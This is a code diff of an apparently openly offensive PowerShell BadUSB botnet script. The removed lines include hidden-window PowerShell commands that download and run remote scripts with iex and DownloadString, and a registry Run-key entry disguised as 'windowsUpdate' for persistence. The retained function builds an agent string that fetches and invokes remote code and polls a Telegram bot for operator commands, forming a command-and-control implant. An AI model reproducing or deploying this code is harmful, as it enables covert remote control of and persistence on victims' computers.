@@ -1,32 +1,3 @@
-
-<#  
-BADUSB COMMANDS:
-    # Execute 
-    powershell.exe -windowstyle hidden -file this_file.ps1
-    #Execute script from github
-    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-REGEDIT:
-	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
-    https://www.akadia.com/services/windows_registry.html 
-BOT TELEGRAM:
-    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
-	#>
-
-
-############
-## CONFIG ##
-############
-
-
-########################################################## Agent Bot Code ##########################################################
-
-#function create_agent {param ($botkey,$chat_id)
-#$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
-
-
-
 function create_agent {param ($botkey,$chat_id)
 $agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";Start-Sleep -s $delay';$agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
 
